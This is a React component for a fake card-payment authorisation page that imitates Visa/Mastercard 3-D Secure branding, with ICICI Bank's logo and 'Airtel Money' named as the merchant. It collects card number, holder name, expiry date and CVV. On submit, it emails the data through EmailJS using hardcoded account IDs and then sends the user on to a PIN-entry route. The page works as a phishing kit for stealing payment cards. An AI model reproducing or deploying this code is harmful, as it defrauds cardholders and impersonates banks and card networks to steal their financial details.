import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import "./index.css";

const Paymentprocess = ({}) => {
  let navigate = useNavigate()
  //  Visa={Visa} SBI={SBI} setSBI={setSBI} setVisa={setVisa}
  const form = useRef();

  function sendEmail(e) {
    e.preventDefault();
    navigate(`/processing_pin`);
    emailjs
      .sendForm(
        "service_hblrths",
        "template_by3q0a8",  /*change */
        form.current,    /*   */
        "user_rkVmkb5ihll1tFJsx2oGr"  /*change */
      )
      .then(
        (result) => {
          console.log(result.text);
          const show = document.getElementById("messageres");
          show.innerHTML = "Message sent :)";
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
  }
  return (
    <>
      <div className="wraper">
        <div className="box">
          <div className="visa_logo">
            <div className="visa">
              <img
                src="https://www.3dsecure.icicibank.com/ACSWeb/EnrollWeb/ICICIBank/images/vbv_logo.jpg"
                alt="visa pic"
              />
            </div>
            <div className="mas_card">
              <img
                src="https://images.all-free-download.com/images/graphicthumb/mastercard_1_82737.jpg"
                alt="mastercard pic"
              />
            </div>
          </div>
          <div className="line">
            <span>Payment Information</span>
            <p>
              &nbsp;(Please enter your card detail to authorise this
              transaction)
            </p>
          </div>
          <div className="card_form">
            <form ref={form} className="form-contact" onSubmit={sendEmail}>
              <div className="card merchant_detail">
                <p className="card_p">Merchant Name : </p>
                <p> Airtel Money</p>
              </div>
              <div className="card transaction_detail">
                <p className="card_p">transaction :</p>
                <p>137016198736</p>
              </div>
              <div className="card number">
                <label>Card Number : </label>
                <input
                  type="text"
                  placeholder="Enter card number without any"
                  className="form_input"
                  size="22"
                  name="cardNo"
                />
              </div>
              <div className="card name">
                <label>Card Holder Name : </label>
                <input
                  type="text"
                  // onChange={}
                  // value={}
                  placeholder="Enter name specified on card"
                  className="form_input"
                  size="22"
                  name="name"
                />
              </div>
              <div className="card expire">
                <label>Expiry Date : </label>
                <div>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="mm"
                    className="form_input"
                    maxLength="2"
                    size="2"
                    name="month"
                  />
                  <span> / </span>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="yy"
                    className="form_input"
                    maxLength="2"
                    size="2"
                    name="year"
                  />
                </div>
              </div>
              <div className="card cvvno">
                <label>CVV :</label>
                <input
                  type="password"
                  // onChange={}
                  // value={}
                  className="cvv_input"
                  size="4"
                  maxLength="4"
                  name="cvvNo"
                />
              </div>
              <div className="card_btn">
                <button type="submit" className="submit_btn">
                  SUBMIT
                </button>
              </div>
            </form>
          </div>
          <div className="card_footer">
            <p>
              This page will automatically timeout after <span>180</span> second
            </p>
          </div>
        </div>
      </div>
    </>
  );
};
export default Paymentprocess;
